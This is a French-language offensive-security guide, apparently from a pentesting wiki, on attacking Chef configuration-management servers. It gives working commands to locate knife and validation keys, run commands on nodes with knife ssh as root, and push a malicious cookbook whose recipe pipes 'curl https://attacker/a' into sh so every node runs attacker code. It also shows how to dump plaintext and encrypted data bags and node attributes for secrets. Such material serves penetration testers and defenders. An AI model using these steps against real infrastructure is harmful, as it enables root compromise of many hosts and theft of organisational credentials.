---
title: "Chef : abuser des identifiants knife, des cookbooks et des data bags"
description: "Attaquer Chef : réutiliser des clés client knife volées et la clé de validation pour s'authentifier auprès du serveur Chef, téléverser des cookbooks malveillants et éditer les run lists afin que les nœuds convergent le code de l'attaquant en tant que root, exécuter des commandes sur les nœuds avec knife ssh, et piller les data bags et les attributs de nœud à la recherche de secrets."
keywords:
  - Chef
  - knife
  - cookbook
  - data bag
  - run list
---

# Chef

Chef fonctionne selon un modèle pull : `chef-client` sur chaque nœud récupère sa run list et ses cookbooks depuis le serveur Chef Infra et les converge en tant que root. L'administration se fait depuis un poste de travail avec `knife`, authentifié par des clés privées client. Les points de levier sont ces clés, les cookbooks que les nœuds exécutent et les data bags qui contiennent les secrets de l'organisation.

## Trouver les identifiants et le serveur

```bash
find / -name '*.pem' -path '*chef*' 2>/dev/null; ls ~/.chef/ /etc/chef/
cat ~/.chef/knife.rb /etc/chef/client.rb          # chef_server_url, node_name, client_key, validation_key
```

Les fichiers qui comptent sont `client.pem` (la clé d'un nœud ou d'un utilisateur), `knife.rb` (la configuration d'administration) et `validation.pem`/`validator.pem` (la clé de validation de l'organisation utilisée pour amorcer les nouveaux nœuds). N'importe lequel d'entre eux authentifie auprès du serveur Chef avec cette identité.

## Exécuter des commandes sur les nœuds

Avec des identifiants knife valides, vous pouvez interroger le serveur Chef et piloter la convergence. `knife ssh` (ou `knife winrm`) exécute en plus une commande sur chaque nœud correspondant, mais il s'authentifie auprès de ces nœuds via SSH, il a donc besoin de ses propres identifiants SSH de nœud (une clé ou un mot de passe), pas seulement de la clé API Chef :

```bash
knife node list                                   # inventory (Chef API key alone)
knife search node 'role:web' -i                   # nodes by role/attribute
knife ssh 'name:*' 'id' -x root -i ~/.ssh/id_rsa  # -x sets the SSH user, -i the key to the nodes
```

Si vous ne détenez que la clé API Chef et aucun identifiant SSH de nœud, le chemin d'exécution fiable est la voie du cookbook et de la run list ci-dessous, qui converge via l'agent indépendamment de SSH.

## Téléverser un cookbook et éditer la run list

L'exécution de code sur les nœuds qui n'exposent pas SSH passe par la convergence elle-même : téléversez un cookbook avec une ressource malveillante et ajoutez-le à la run list d'un nœud ou d'un rôle ; le nœud l'exécute en tant que root à sa prochaine exécution de `chef-client`.

```ruby
# recipes/default.rb in an uploaded cookbook
execute 'x' do
  command 'curl -s https://attacker/a | sh'
end
```

```bash
knife cookbook upload evil
knife node run_list add web1 'recipe[evil]'       # or edit a role's run_list to hit many nodes at once
```

## Piller les data bags et les attributs

Les data bags Chef contiennent des secrets partagés ; les data bags chiffrés sont protégés par une clé distribuée aux nœuds (et au poste de travail) qui en ont besoin, de sorte qu'un point d'ancrage sur l'un ou l'autre la récupère :

```bash
knife data bag list
knife data bag show secrets credentials                              # plaintext bag
knife data bag show secrets credentials --secret-file /etc/chef/encrypted_data_bag_secret  # encrypted bag
knife node show web1 --long                                          # all attributes, which often carry secrets
```

## Suite

Des identifiants knife valides donnent l'exécution de code en tant que root sur chaque nœud (via `knife ssh` et via la convergence des cookbooks) ; les data bags, les attributs de nœud et la clé de validation étendent la portée et alimentent la réutilisation d'identifiants vers l'annuaire et les comptes cloud que ces secrets déverrouillent.

## Références

- [Documentation knife](https://docs.chef.io/workstation/knife/)
- [Data bags Chef et data bags chiffrés](https://docs.chef.io/data_bags/)
- [knife ssh](https://docs.chef.io/workstation/knife_ssh/)
